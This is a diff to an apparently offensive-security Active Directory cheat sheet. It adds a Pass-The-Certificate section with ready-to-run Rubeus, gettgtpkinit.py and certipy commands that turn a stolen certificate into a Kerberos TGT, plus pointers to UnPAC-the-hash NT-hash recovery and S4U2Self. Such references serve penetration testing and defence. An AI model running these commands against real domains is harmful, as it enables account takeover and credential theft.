@@ -91,3 +91,42 @@ python3 examples/ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2s
 ```shell
 python3 gettgtpkinit.py <domain>/<username> -pfx-base64 $(cat <base64-cert.file>) -dc-ip <dc-ip> out_tgt.ccache
 ```
+
+# Pass-The-Certificate
+A Kerberos service ticket, can only be obtained by presenting a TGT. This TGT can be obtained by
+a) ASREPRoast (if Kerberos pre-auth is disabled)
+b) symmetrical pre-authentication (using a DES,RC4,AES128 or AES256 key)
+c) asymmetrical pre-authentication (using certificates) --> This is also called PKINIT
+
+Pass-The-Certificate is the fancy given name of this certificate based pre-authentication.   
+
+NOTE: Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. 
+
+## Windows
+`Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show`   
+
+NOTE: PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.   
+`openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"`   
+
+## Unix 
+```
+# PFX certificate (file) + password (string, optionnal)
+gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+
+# Base64-encoded PFX certificate (string) (password can be set)
+gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+
+# PEM certificate (file) + PEM private key (file)
+gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+```
+Alternatively, certipy (python) can be used:   
+`certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'`   
+Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file:   
+`certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"`   
+
+The ticket obtained can then be used to:   
+1. authenticate with [pass-the-cache](https://www.thehacker.recipes/ad/movement/kerberos/ptc)   
+2. conduct an [UnPAC-the-hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) attack. This can be done with getnthash.py from PKINITtools.   
+3. obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from PKINITtools.   
+
+NOTE: When using Certipy for Pass-the-Certificate, it automatically does UnPAC-the-hash to recover the account's NT hash, in addition to saving the TGT obtained.   
